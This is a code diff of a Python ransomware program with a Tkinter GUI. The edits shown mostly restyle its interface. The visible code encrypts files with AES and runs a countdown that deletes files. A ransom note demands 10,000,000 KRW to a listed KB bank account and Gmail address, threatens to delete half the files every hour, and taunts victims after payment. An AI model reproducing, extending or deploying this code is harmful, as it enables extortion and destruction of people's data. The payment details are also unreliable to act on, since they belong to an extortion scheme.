@@ -17,9 +17,9 @@ import tkinter
 from tkinter.ttk import Label
 from PIL import Image, ImageTk
 
-
-#self.window.protocol("WM_DELETE_WINDOW", self.disable_event(self))
+# self.window.protocol("WM_DELETE_WINDOW", self.disable_event(self))
 iv = os.urandom(16)
+
 
 def enc(key, cipher, in_filename, out_filename=None):
     ciphertext = cipher.encrypt(key)  # 128비트
@@ -47,6 +47,7 @@ def enc(key, cipher, in_filename, out_filename=None):
             e_data = encryptor.encrypt(data)
             outfile.write(e_data)
 
+
 def dec(cipher, in_filename, out_filename=None):
     mode = AES.MODE_CBC
 
@@ -71,6 +72,7 @@ def dec(cipher, in_filename, out_filename=None):
             d_data = decryptor.decrypt(e_data)
             d_data = d_data[:size_of_data]
             outfile.write(d_data)
+
 
 def removeFiles(gui, remove_filelist):  # ext 안쓰더라 지워버림
     gui.l_thanos.destroy()
@@ -99,7 +101,8 @@ def removeFiles(gui, remove_filelist):  # ext 안쓰더라 지워버림
 
     gui.listWindow.destroy()
 
-    startTimer(gui, os.getcwd())  #@@
+    startTimer(gui, os.getcwd())  # @@
+
 
 class AnimatedGIF(Label, object):
     def __init__(self, master, path, forever=True):
@@ -196,6 +199,7 @@ class AnimatedGIF(Label, object):
         self.stop_animation()
         super(AnimatedGIF, self).place_forget(**kwargs)
 
+
 class MyTk:
     def __init__(self, parent=None):
         self.parent = parent
@@ -209,9 +213,10 @@ class MyTk:
                                     text="\nYOUR FILES HAVE BEEN ENCRYPTED."
                                          "\nYour photos, documents, etc..."
                                          "\nBut, don't worry! I have not deleted them yet :D"
-                                         "\nYou have some time to pay 10,000,000KRW in this account(KB 786102-00-040854) to get the decryption key."
-                                         "\nif you send money, send an e-mail with your account at this address."
-                                         "\nOur e-mail address: secureantdd@gmail.com"
+                                         "\nYou have some time to pay 10,000,000KRW in our account to get the decryption key."
+                                         "\nOUR ACCOUNT : KB 786102-00-040854"
+                                         "\nIf you send money, send an e-mail with your account at this address."
+                                         "\nOUR E-MAIL ADDRESS : secureantdd@gmail.com"
                                          "\nEvery hour half of all files will be deleted."
                                          "\n--WARNING--"
                                          "\nDo not force-terminate this program."
@@ -220,12 +225,12 @@ class MyTk:
                                     fg="green", bg="black", font='Helvetica 14 bold')
         self.l_text.pack()
 
-        self.l_timer = tkinter.Label(self.window, text="start the timer!", fg="green", bg="black",
-                                     font='Helvetica 14 bold')
+        self.l_timer = tkinter.Label(self.window, text="Start the timer!", fg="red", bg="black",
+                                     font='Helvetica 24 bold')
         self.l_timer.pack()
 
         self.l_input = tkinter.Label(self.window,
-                                     text="\npassword:",
+                                     text="\nPassword:",
                                      fg="green", bg="black", font='Helvetica 14 bold')
         self.l_input.pack()
 
@@ -271,20 +276,29 @@ class MyTk:
         self.pwbutton.destroy()
         self.l_thanos.destroy()
 
-        self.l_text.config(text="\nYour files have been decrypted! Thank you, idiot.\n\n", font='Helvetica 16 bold')
+        self.l_text.config(text="\nYour files have been decrypted! Thank you, idiot.\n\n", fg="red",
+                           font='Helvetica 24 bold')
 
         self.final_image = tkinter.PhotoImage(file="../ui/final_thanos.png")
         self.l_final = tkinter.Label(self.window, image=self.final_image, padx=10, pady=50)
         self.l_final.pack()
 
-    def allRemovePrint(self):
-        self.l_thanos.pack_forget()
-        l_allremove = tkinter.Label(self.window, text="\n\nYour files are all deleted.\n\n",
-                                    fg="green", bg="black", font='Helvetica 16 bold')
-        l_allremove.pack()
-        sleep(3)
-        self.listwindow.destroy()
+        sleep(5)
         self.window.destroy()
+
+    def allRemovePrint(self):
+        self.l_timer.destroy()
+        self.l_input.destroy()
+        self.password.destroy()
+        self.pwbutton.destroy()
+        self.l_thanos.destroy()
+
+        self.l_text.config(text="\n\n\n\nYour files are all deleted.\n\n", fg="red",
+                           font='Helvetica 50 bold')
+
+        sleep(5)
+        self.window.destroy()
+
 
 def startTimer(gui, path, ext=None):
     sleep(1)
@@ -316,6 +330,7 @@ def startTimer(gui, path, ext=None):
 
     clock(gui, 10, antdd_filelist)
 
+
 def clock(gui, sec, antdd_filelist):
     sec -= 1
 
@@ -335,6 +350,7 @@ def clock(gui, sec, antdd_filelist):
 
     # 자기 자신 호출
     threading.Timer(1, clock, [gui, sec, antdd_filelist]).start()
+
 
 class RealMain:
 
@@ -365,7 +381,6 @@ class RealMain:
                         filelist.append(name)
                     else:
                         continue
-
 
         return filelist
 
@@ -440,7 +455,7 @@ class RealMain:
                         os.remove(dec_target)
                     self.myGui.finalGui()
 
-if __name__ == "__main__":
 
+if __name__ == "__main__":
     r = RealMain()
     r.run()
